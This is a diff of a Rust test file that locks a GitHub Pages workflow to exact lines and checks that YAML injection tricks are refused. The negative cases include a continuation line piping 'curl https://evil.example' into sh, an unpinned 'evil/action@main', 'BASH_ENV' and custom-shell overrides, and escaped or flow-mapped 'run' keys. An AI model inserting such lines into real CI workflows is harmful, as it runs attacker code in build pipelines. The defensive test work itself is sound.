@@ -1,12 +1,150 @@
 //! E-GHFLOW2.W8: the Pages workflow's contract - what starts it, what each job may touch, that the
 //! build job runs main's builder on git data with a read token and the deploy job runs no repository
-//! code. Read line by line, like `keel_gate.rs` reads keel-gate.yml.
+//! code. Read line by line, like `keel_gate.rs` reads keel-gate.yml; `locked` holds the file to the
+//! exact lines those readers understand.
 compiled!();
 
 use crate::keel_gate::{block, job, jobs, read};
 
 fn yml() -> String {
     read(".github/workflows/pages.yml")
+}
+
+/// The pinned actions besides checkout, whose pin dist-workspace.toml holds; each pin is written once.
+const UPLOAD: &str = "actions/upload-pages-artifact@fc324d3547104276b827a68afc52ff2a11cc49c9";
+const DEPLOY: &str = "actions/deploy-pages@368f82528645a54fb793d4d04e342629a3f51346";
+
+fn checkout() -> String {
+    let dist: toml::Table = read("dist-workspace.toml").parse().unwrap();
+    format!("actions/checkout@{}", dist["dist"]["github-action-commits"]["actions/checkout"].as_str().unwrap())
+}
+
+/// Every line of pages.yml that is not blank or a whole-line comment, in order, each exactly as
+/// written. The readers below go line by line; this is what makes that sound (code review 2): any
+/// other line - a plain scalar's continuation, an anchor or alias, a flow mapping, a quoted or
+/// escaped key, an unlisted key at any level (env, defaults, container, services), a trailing
+/// comment, a CR inside a line - is refused, never parsed. A comment line at any column is dropped
+/// first, so a comment can neither hide a step from the readers nor fail the lock.
+const LOCK: &str = r#"name: Pages
+on:
+  workflow_run:
+    workflows:
+      - Keel gate
+    types:
+      - completed
+permissions: {}
+concurrency:
+  group: pages
+  cancel-in-progress: false
+jobs:
+  build:
+    if: github.event.workflow_run.head_repository.full_name == github.repository
+    runs-on: ubuntu-24.04
+    timeout-minutes: 10
+    permissions:
+      contents: read
+    steps:
+      - uses: {checkout}
+        with:
+          ref: main
+          fetch-depth: 0
+          persist-credentials: false
+      - run: scripts/pages-build.sh "$RUNNER_TEMP/site"
+      - uses: {upload}
+        with:
+          path: ${{ runner.temp }}/site
+  deploy:
+    needs: build
+    runs-on: ubuntu-24.04
+    timeout-minutes: 15
+    permissions:
+      pages: write
+      id-token: write
+    environment:
+      name: github-pages
+      url: ${{ steps.deployment.outputs.page_url }}
+    steps:
+      - id: deployment
+        uses: {deploy}"#;
+
+/// `Err` naming the first line where `y`'s code lines leave `LOCK`, or a missing or extra line.
+fn locked(y: &str) -> Result<(), String> {
+    let want = LOCK.replace("{checkout}", &checkout()).replace("{upload}", UPLOAD).replace("{deploy}", DEPLOY);
+    let got: Vec<&str> = y.lines().filter(|l| !l.trim().is_empty() && !l.trim_start().starts_with('#')).collect();
+    let want: Vec<&str> = want.lines().collect();
+    for i in 0..got.len().max(want.len()) {
+        if got.get(i) != want.get(i) {
+            return Err(format!("line {}: got {:?}, want {:?}", i + 1, got.get(i), want.get(i)));
+        }
+    }
+    Ok(())
+}
+
+#[test]
+fn the_workflow_is_exactly_the_locked_lines() {
+    assert_eq!(locked(&yml()), Ok(()));
+}
+
+/// pages.yml with `add` put after its line `after` (which must be there once), or `after` replaced
+/// by `add` when `replace`.
+fn mutated(after: &str, add: &str, replace: bool) -> String {
+    let y = yml();
+    assert_eq!(y.lines().filter(|l| *l == after).count(), 1, "{after:?} is one line of pages.yml");
+    y.lines()
+        .flat_map(|l| {
+            if l != after {
+                vec![l.to_string()]
+            } else if replace {
+                vec![add.to_string()]
+            } else {
+                vec![l.to_string(), add.to_string()]
+            }
+        })
+        .collect::<Vec<_>>()
+        .join("\n")
+        + "\n"
+}
+
+/// Each mutation class code review 2 found passing the line readers is refused by the lock; a comment
+/// at any column, alone, is not.
+#[test]
+fn the_lock_refuses_every_layout_the_line_readers_would_misread() {
+    let run = r#"      - run: scripts/pages-build.sh "$RUNNER_TEMP/site""#;
+    let deploy_end = format!("        uses: {DEPLOY}");
+    let co = format!("      - uses: {}", checkout());
+    let refused: Vec<(&str, String)> = vec![
+        ("a plain scalar's continuation line under build's run", mutated(run, "        ; curl https://evil.example | sh", false)),
+        ("an anchor on build's step", mutated(run, &run.replace("- run:", "- &b run:"), true)),
+        ("an alias reusing a build step in deploy", mutated(&deploy_end, "      - *b", false)),
+        ("an anchor on the checkout step", mutated(&co, &co.replace("- uses:", "- &co uses:"), true)),
+        ("a flow-mapping step in deploy", mutated(&deploy_end, "      - {uses: ./local-action}", false)),
+        ("a flow-mapping run in deploy", mutated(&deploy_end, "      - {run: curl x}", false)),
+        ("a quoted uses key in deploy", mutated(&deploy_end, "      - name: x\n        \"uses\": docker://alpine", false)),
+        ("an escaped run key in deploy", mutated(&deploy_end, "      - name: x\n        \"\\x72un\": curl x", false)),
+        ("a run after - name: in deploy", mutated(&deploy_end, "      - name: x\n        run: curl x", false)),
+        ("a step after a column-0 comment in build", mutated("          persist-credentials: false", "# note\n      - run: curl x", false)),
+        ("an unpinned action after a comment in build", mutated("          persist-credentials: false", "  # note\n      - uses: evil/action@main", false)),
+        ("a permission after a comment in build", mutated("      contents: read", "  # note\n      pages: write", false)),
+        ("a top-level env", mutated("permissions: {}", "env:\n  BASH_ENV: x", false)),
+        ("a top-level defaults", mutated("permissions: {}", "defaults:\n  run:\n    shell: perl {0}", false)),
+        ("a container on deploy", mutated("    timeout-minutes: 15", "    container: alpine", false)),
+        ("services on deploy", mutated("    timeout-minutes: 15", "    services:\n      x:\n        image: y", false)),
+        ("an env on deploy", mutated("    timeout-minutes: 15", "    env:\n      A: b", false)),
+        ("a trailing comment", mutated("    timeout-minutes: 15", "    timeout-minutes: 15 # x", true)),
+        ("a CR inside a line", mutated("    timeout-minutes: 15", "    timeout-minutes: 15\r    env: {A: b}", true)),
+        ("a third job", format!("{}  pages2:\n    runs-on: ubuntu-24.04\n", yml())),
+        ("a second document", format!("{}---\nname: x\n", yml())),
+    ];
+    for (what, y) in &refused {
+        assert!(locked(y).is_err(), "{what} passed the lock:\n{y}");
+    }
+    for (what, y) in [
+        ("a column-0 comment in a job", mutated("          persist-credentials: false", "# note", false)),
+        ("an indented comment in deploy", mutated("    timeout-minutes: 15", "      # note", false)),
+        ("a blank line", mutated("    timeout-minutes: 15", "", false)),
+    ] {
+        assert_eq!(locked(&y), Ok(()), "{what}");
+    }
 }
 
 /// The workflow's lines that are not comments, so a word in the header comment proves nothing.
@@ -43,7 +181,8 @@ fn the_build_job_reads_with_contents_read_and_only_the_deploy_job_holds_the_page
 
 /// The commands of every `run:` key in job lines `j` - a step's first key (`- run: x`) or a later one
 /// (`run: x` under `- name: y`) - or `Err` naming a line that mentions run in a form this reader does
-/// not parse (a flow mapping `- {run: x}`, a quoted key, `run :`), so no command hides from it.
+/// not parse (a flow mapping `- {run: x}`, a quoted key, `run :`). It reads lines, not YAML: an
+/// escaped key or a continuation line escapes it, and `locked` is what refuses those.
 /// `runs-on:`, the `runner.` context and the fork filter's `event.workflow_run.` are the only other
 /// words holding "run" a job may use.
 fn runs(j: &[String]) -> Result<Vec<String>, String> {
@@ -62,8 +201,7 @@ fn runs(j: &[String]) -> Result<Vec<String>, String> {
 #[test]
 fn the_run_reader_sees_a_run_key_wherever_a_step_puts_it() {
     let y = yml();
-    let deploy_end = "        uses: actions/deploy-pages@368f82528645a54fb793d4d04e342629a3f51346";
-    assert!(y.trim_end().ends_with(deploy_end), "the deploy job is the file's last block");
+    assert!(y.trim_end().ends_with(&format!("        uses: {DEPLOY}")), "the deploy job is the file's last block");
     let with = |extra: &str| format!("{}\n{extra}", y.trim_end());
     let cases: [(&str, Result<Vec<String>, String>); 6] = [
         ("      - run: curl x", Ok(vec!["curl x".into()])),
@@ -88,10 +226,8 @@ fn two_jobs_build_runs_main_s_builder_and_deploy_runs_only_the_deploy_action() {
     assert_eq!(runs(&build), Ok(vec![r#"scripts/pages-build.sh "$RUNNER_TEMP/site""#.to_string()]));
     assert_eq!(runs(&deploy), Ok(vec![]), "the deploy job runs no command");
     let uses = |j: &[String]| -> Vec<String> { j.iter().filter_map(|l| l.trim().trim_start_matches("- ").strip_prefix("uses: ").map(String::from)).collect() };
-    let dist: toml::Table = read("dist-workspace.toml").parse().unwrap();
-    let checkout = dist["dist"]["github-action-commits"]["actions/checkout"].as_str().unwrap();
-    assert_eq!(uses(&build), [format!("actions/checkout@{checkout}"), "actions/upload-pages-artifact@fc324d3547104276b827a68afc52ff2a11cc49c9".to_string()]);
-    assert_eq!(uses(&deploy), ["actions/deploy-pages@368f82528645a54fb793d4d04e342629a3f51346"], "no checkout: no repository code in the deploy job");
+    assert_eq!(uses(&build), [checkout(), UPLOAD.to_string()]);
+    assert_eq!(uses(&deploy), [DEPLOY], "no checkout: no repository code in the deploy job");
     for u in uses(&build).iter().chain(&uses(&deploy)) {
         let pin = u.split_once('@').unwrap().1;
         assert!(pin.len() == 40 && pin.bytes().all(|b| b.is_ascii_hexdigit()), "{u} is pinned to a 40-hex commit");
